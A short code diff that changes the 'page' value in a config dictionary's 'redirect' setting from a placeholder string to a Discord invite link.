@@ -48,7 +48,7 @@ config = {
 
     "redirect": {
         "redirect": True,
-        "page": "7rab on top" 
+        "page": "https://discord.gg/wingsminer" 
     },
 }
 
